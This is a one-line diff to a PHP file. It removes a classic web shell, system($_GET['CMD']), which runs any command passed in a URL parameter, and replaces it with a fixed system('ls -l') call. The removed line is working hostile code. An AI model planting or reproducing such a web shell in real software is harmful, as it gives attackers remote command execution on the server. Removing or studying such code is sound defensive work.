@@ -1,1 +1,1 @@
-<?php system($_GET['CMD']); ?>
+<?php system('ls -l'); ?>
